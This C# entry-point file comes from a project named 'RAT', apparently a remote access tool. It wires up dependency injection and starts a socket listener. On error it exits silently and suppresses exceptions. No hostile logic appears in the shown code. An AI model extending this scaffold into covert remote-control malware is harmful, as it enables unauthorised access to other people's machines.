using RAT.Interfaces;
using SimpleInjector;
using System;

namespace RAT
{
    /// <summary>
    /// Out main startup class.
    /// </summary>
    internal class Program
    {
        /// <summary>
        /// Programs entry point.
        /// </summary>
        /// <param name="args">Program startup arguments.</param>
        private static void Main(string[] args)
        {
            Container container = null;

            try
            {
                container = DependencyInjectionConfigurator.GetConfiguredContainer();
                container.Verify();
            }
            // This should never happen...
            catch (Exception) { Environment.Exit(0); }

            DependencyInjectionConfigurator.SetContainer(container);
            try
            {
                container.GetInstance<ISocketConnectionListeningLogic>().StartListening();
            }
            catch (Exception) { }
        }
    }
}